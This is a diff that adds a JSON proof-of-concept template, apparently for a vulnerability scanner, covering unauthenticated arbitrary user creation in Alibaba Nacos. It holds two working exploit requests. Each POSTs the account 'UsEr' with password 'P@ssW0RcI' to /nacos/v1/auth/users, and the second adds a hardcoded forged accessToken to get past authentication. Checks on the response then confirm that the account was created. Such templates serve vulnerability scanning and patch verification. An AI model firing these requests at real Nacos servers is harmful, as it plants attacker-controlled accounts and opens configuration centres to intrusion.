@@ -1,0 +1,67 @@
+{
+  "product": "Alibaba Nacos",
+  "vul_name": "Nacos (v1/auth/users) 任意用户添加",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "按照官方文档配置启动,默认是不需要登录的，这样会导致配置中心对外直接暴露。",
+  "version": "",
+  "note": "如果漏洞存在，则添加了用户:UsEr 密码:P@ssW0RcI",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.csdn.net/zhanghang10/article/details/131593424",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "logic": "or",
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/nacos/v1/auth/users",
+        "data": {
+          "username": "UsEr",
+          "password": "P@ssW0RcI"
+        }
+      },
+      "verify": {
+        "logic": "or",
+        "check": [
+          {
+            "status": 200,
+            "body": "create user ok"
+          },
+          {
+            "status": 200,
+            "body": "already exist!"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc",
+        "data": {
+          "username": "UsEr",
+          "password": "P@ssW0RcI"
+        }
+      },
+      "verify": {
+        "logic": "or",
+        "check": [
+          {
+            "status": 200,
+            "body": "create user ok"
+          },
+          {
+            "status": 200,
+            "body": "already exist!"
+          }
+        ]
+      }
+    }
+  ]
+}
